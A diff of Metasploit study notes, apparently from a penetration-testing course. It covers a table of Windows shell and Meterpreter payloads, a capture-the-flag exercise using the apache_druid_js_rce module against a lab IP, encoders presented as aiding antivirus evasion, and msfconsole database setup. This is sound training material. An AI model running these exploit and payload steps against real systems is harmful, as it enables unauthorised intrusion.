@@ -196,17 +196,109 @@ As mentioned above, Meterpreter payloads offer us a significant amount of flexib
 
 The table below contains the most common payloads used for Windows machines and their respective descriptions.
 
-|**Payload**|**Description**|
-|---|---|
-|`generic/custom`|Generic listener, multi-use|
-|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
-|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
-|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
-|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
-|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
-|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
-|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
-|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
-|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
-|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
-|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|
+| **Payload**                       | **Description**                                                        |
+| --------------------------------- | ---------------------------------------------------------------------- |
+| `generic/custom`                  | Generic listener, multi-use                                            |
+| `generic/shell_bind_tcp`          | Generic listener, multi-use, normal shell, TCP connection binding      |
+| `generic/shell_reverse_tcp`       | Generic listener, multi-use, normal shell, reverse TCP connection      |
+| `windows/x64/exec`                | Executes an arbitrary command (Windows x64)                            |
+| `windows/x64/loadlibrary`         | Loads an arbitrary x64 library path                                    |
+| `windows/x64/messagebox`          | Spawns a dialog via MessageBox using a customizable title, text & icon |
+| `windows/x64/shell_reverse_tcp`   | Normal shell, single payload, reverse TCP connection                   |
+| `windows/x64/shell/reverse_tcp`   | Normal shell, stager + stage, reverse TCP connection                   |
+| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
+| `windows/x64/meterpreter/$`       | Meterpreter payload + varieties above                                  |
+| `windows/x64/powershell/$`        | Interactive PowerShell sessions + varieties above                      |
+| `windows/x64/vncinject/$`         | VNC Server (Reflective Injection) + varieties above                    |
+## Exercise
+
+### Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
+
+```shell
+sudo nmap 10.129.203.52 -p 8081,8082,8083,8888 -Pn -O --script banner 
+# I found out that the service where Druid is running is on port 8888
+msfconsole
+serach druid
+
+use exploit/linux/http/apache_druid_js_rce
+# SET THE OPTIONS AND RUN
+# WE GOT THE SHELL AND LOOKED FOR flag.txt
+find / -name flag.txt 2>/dev/null
+```
+
+# Encoders
+
+Over the 15 years of existence of the Metasploit Framework, `Encoders` have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. `Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:
+
+|`x64`|`x86`|`sparc`|`ppc`|`mips`|
+|---|---|---|---|---|
+Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.
+# Databases
+
+`Databases` in `msfconsole` are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc.
+## Setting up the Database
+
+First, we must ensure that the PostgreSQL server is up and running on our host machine. To do so, input the following command:
+#### PostgreSQL Status
+
+```shell
+sudo service postgresql status
+```
+#### Start PostgreSQL
+```shell
+sudo systemctl start postgresql
+```
+
+After starting PostgreSQL, we need to create and initialize the MSF database with `msfdb init`.
+#### MSF - Initiate a Database
+
+```shell
+sudo msfdb init
+```
+
+Sometimes an error can occur if Metasploit is not up to date. This difference that causes the error can happen for several reasons. First, often it helps to update Metasploit again (`apt update`) to solve this problem. Then we can try to reinitialize the MSF database.
+
+If the initialization is skipped and Metasploit tells us that the database is already configured, we can recheck the status of the database.
+
+```shell
+sudo msfdb status
+```
+
+If this error does not appear, which often happens after a fresh installation of Metasploit, then we will see the following when initializing the database:
+
+```shell
+sudo msfdb init
+```
+
+After the database has been initialized, we can start `msfconsole` and connect to the created database simultaneously.
+#### MSF - Connect to the Initiated Database
+
+```shell
+sudo msfdb run
+```
+If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
+#### MSF - Reinitiate the Database
+
+```shell
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+
+msf6 > db_status
+```
+
+Now, we are good to go. The `msfconsole` also offers integrated help for the database. This gives us a good overview of interacting with and using the database.
+#### MSF - Database Options
+
+```shell
+help database
+```
+## Using the Database
+
+With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our `Workspaces`.
+#### Workspaces
+
+We can think of `Workspaces` the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
+
+To view the current Workspace list, use the `workspace` command. Adding a `-a` or `-d` switch after the command, followed by the workspace's name, will either `add` or `delete` that workspace to the database.
